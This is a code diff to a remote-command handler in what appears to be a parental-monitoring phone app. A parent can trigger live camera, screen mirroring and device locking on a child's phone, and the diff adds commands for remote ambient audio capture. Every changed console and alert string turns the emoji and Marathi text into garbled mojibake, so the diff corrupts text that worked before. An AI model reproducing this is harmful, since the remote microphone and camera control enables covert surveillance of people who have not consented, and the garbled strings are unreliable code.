@@ -16,6 +16,7 @@ class RemoteCommandHandler {
     this.socket = null;
     this.screenListener = null;
     this.cameraListener = null;
+    this.audioListener = null;
   }
 
   async init() {
@@ -31,7 +32,7 @@ class RemoteCommandHandler {
     // Connect to WebSockets
     this.socket = io(SOCKET_SERVER_URL);
     this.socket.on('connect', () => {
-        console.log('✅ Child Socket Connected:', this.socket.id);
+        console.log('âœ… Child Socket Connected:', this.socket.id);
         this.socket.emit('join_room', { parentId: this.parentId });
     });
 
@@ -75,7 +76,7 @@ class RemoteCommandHandler {
       });
 
     this.isInitialized = true;
-    console.log('🎯 RemoteCommandHandler Ready (Socket.io Enabled)');
+    console.log('ðŸŽ¯ RemoteCommandHandler Ready (Socket.io Enabled)');
   }
 
   async handleCommand(commandId, commandData) {
@@ -86,6 +87,12 @@ class RemoteCommandHandler {
       switch (command) {
         case 'START_LIVE_CAMERA':
           if (RemoteCamera) await RemoteCamera.startLiveCamera(data.useFront || false, data.intervalSeconds || 1);
+          break;
+        case 'START_AUDIO_CAPTURE':
+          if (AmbientAudio) await AmbientAudio.startAmbientCapture(data.requestId || 'audio');
+          break;
+        case 'STOP_AUDIO_CAPTURE':
+          if (AmbientAudio) await AmbientAudio.stopAmbientCapture();
           break;
         case 'STOP_LIVE_CAMERA':
           if (RemoteCamera) await RemoteCamera.stopLiveCamera();
@@ -100,7 +107,7 @@ class RemoteCommandHandler {
           if (ScreenMirror) await ScreenMirror.stopLiveView();
           break;
         case 'LOCK_DEVICE':
-          Alert.alert('🔒 Phone Locked', 'Parent ने phone lock केला.', [], { cancelable: false });
+          Alert.alert('ðŸ”’ Phone Locked', 'Parent à¤¨à¥‡ phone lock à¤•à¥‡à¤²à¤¾.', [], { cancelable: false });
           break;
       }
 
@@ -114,6 +121,7 @@ class RemoteCommandHandler {
     if (this.unsubscribe) this.unsubscribe();
     if (this.screenListener) this.screenListener.remove();
     if (this.cameraListener) this.cameraListener.remove();
+    if (this.audioListener) this.audioListener.remove();
     if (this.socket) this.socket.disconnect();
     if (RemoteCamera) RemoteCamera.stopLiveCamera();
     if (ScreenMirror) ScreenMirror.stopLiveView();
